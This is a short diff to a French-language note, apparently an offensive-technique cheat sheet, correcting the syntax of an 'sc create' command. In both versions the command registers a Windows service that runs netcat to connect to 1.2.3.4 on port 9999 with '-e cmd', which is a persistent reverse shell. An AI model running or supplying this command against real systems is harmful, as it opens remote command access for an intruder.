@@ -85,6 +85,6 @@ go
 Créer un service:
 
 ```
-sc create cmdsvc type=own type=interact binpath="C:\tmp\nc64.exe 1.2.3.4 9999 -e cmd"
+sc create cmdsvc binpath= "C:\tmp\nc64.exe 1.2.3.4 9999 -e cmd" type= own type= interact
 sc cmdsvc start
 ```
